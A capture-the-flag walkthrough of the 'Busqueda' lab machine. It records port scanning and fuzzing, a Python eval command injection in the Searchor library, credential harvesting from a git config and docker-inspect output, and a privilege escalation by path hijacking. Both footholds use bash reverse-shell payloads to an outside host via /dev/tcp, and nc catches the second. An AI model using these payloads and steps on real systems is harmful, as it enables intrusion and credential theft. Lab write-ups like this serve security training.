# Nmap Results

```
# Nmap 7.93 scan initiated Sat Jul 15 02:39:40 2023 as: nmap -p- -Pn -sC -sV -T4 -oN nmap.txt -vvvv 10.10.11.208
Nmap scan report for searcher.htb (10.10.11.208)
Host is up, received user-set (0.68s latency).
Scanned at 2023-07-15 02:39:41 EDT for 2031s
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp    open     http    syn-ack     Apache httpd 2.4.52
|_http-title: Searcher
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
37249/tcp filtered unknown no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 15 03:13:32 2023 -- 1 IP address (1 host up) scanned in 2031.66 seconds

```
# Enumerating Port 80
Enumerating port 80, we realize that we are being redirected to another host ```searcher.htb```. Hence, we will have to add searcher.htb to our /etc/hosts file

```
┌──(kali㉿kali)-[~]
└─$ curl -ikL http://10.10.11.208:80          
HTTP/1.1 302 Found
Date: Sat, 15 Jul 2023 06:38:16 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://searcher.htb/
Content-Length: 282
Content-Type: text/html; charset=iso-8859-1

curl: (6) Could not resolve host: searcher.htb
```

Using ffuf on http://searchor.htb, we are able to find a ```/search``` endpoint. However, it seems that this endpoint cannot be accessed via GET request. We would probably have to access this endpoint via either a POST or PUT request
```
┌──(kali㉿kali)-[~/Desktop/busqueda]
└─$ ffuf -u "http://searcher.htbFUZZ" -w wordlist.txt -fs 13519

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://searcher.htbFUZZ
 :: Wordlist         : FUZZ: wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 13519
________________________________________________

/search                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 247ms]
/server-status          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 240ms]
:: Progress: [36040/36040] :: Job [1/1] :: 150 req/sec :: Duration: [0:04:00] :: Errors: 0 ::                                                                                           
```

Visiting http://searcher.htb, we realized that the website is powered by Flask and searchor

# Exploiting Searchor
From the website, we are able to find that Searchor is an open-sourced project that can be downloaded from [here](https://github.com/ArjunSharda/Searchor). We are also able to discover that the version of Searchor that we are using is vulnerable to command injection in the search endpoint.

From the pull request [here](https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b), we are able to find that the vulnerable code is as follows:

```
url = eval( f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})" )
```

By modifying the payload of our search query to become ```'+str(__import__('os').system('id')))#```, we will be able to cause the following command to be executed instead

```
url = eval( f"Engine.{engine}.search(''+str(__import__('os').system('id')))#', copy_url={copy}, open_web={open})" )
```

Lastly, we will have to modify our payload to become ```'+str(__import__("os").system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.7/3000 0>&1'")))#``` to spawn a reverse shell connection

# Obtaining user flag

```
svc@busqueda:/home$ cat /home/svc/user.txt
cat /home/svc/user.txt
<user flag>
```

# Privilege Escalation
Checking the ```/etc/hosts``` file, we are able to discover another subdomain for ```searcher.htb```, which is ```gitea.searcher.htb```

```
cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 busqueda searcher.htb gitea.searcher.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

In the server, we are able to find the credentials for ```cody``` from ```/var/www/app/.git/config```

```
svc@busqueda:/var/www/app/.git$ cat /var/www/app/.git/config
cat /var/www/app/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

Using the password that we have obtained, we would try to escalate our privileges to become a ```cody``` user, but the user does not exist on the server. However, we realize that this is the credentials used for ```svc``` user

```
svc@busqueda:/var/www/app/.git$ sudo -l
sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Executing the script with sudo privileges, we are able to do a ```docker-inspect``` command using the python script with root permissions. From there, we are able to inspect the docker container belonging to mysql and we are able to obtain the database password from there

```
svc@busqueda:/opt/scripts$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' f84a6b33fb5a
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' f84a6b33fb5a
{
        ...
        "MYSQL_USER=gitea",
        "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
        "MYSQL_DATABASE=gitea",
        ...        
}
```

Using the database credentials, we are able to login to gitea.searcher.htb as administrator user. We are then able to find the source code for the scripts at /opt/scripts at http://gitea.searcher.htb/administrator/scripts

Looking at the ```system-check.py``` script, we are able to find a path injection vulnerability in the following lines of codes. This is because, the code does not specify the complete path for ```full-checkup.sh```. This means that we can create a ```/tmp/full-checkup.sh``` script in the /tmp directory and we can execute the ```full-checkup.sh``` script in the ```/tmp``` directory

```
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)

```


To exploit this vulnerability, we will be writing a reverse shell payload into ```/tmp/system-checkup.sh``` and we will then modify the permissions of ```/tmp/system-checkup.sh``` to make it executable
```
svc@busqueda:/tmp$ echo -e '#!/bin/bash\n\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/3000 0>&1"' > full-checkup.sh
echo -e '#!/bin/bash\n\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/3000 0>&1"' > full-checkup.sh
svc@busqueda:/tmp$ cat full-checkup.sh
cat full-checkup.sh
#!/bin/bash

/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/3000 0>&1"
svc@busqueda:/tmp$ 

svc@busqueda:/tmp$ chmod +x full-checkup.sh
chmod +x full-checkup.sh
```

Lastly, we will execute ```/opt/scripts/system-checkup.py``` to spwan our reverse shell connection from ```/tmp``` directory

```
svc@busqueda:/tmp$ chmod +x full-checkup.sh
chmod +x full-checkup.sh
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

# Obtaining root flag

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.208] 41164
root@busqueda:/tmp# cat /root/root.txt
cat /root/root.txt
<root flag>
```
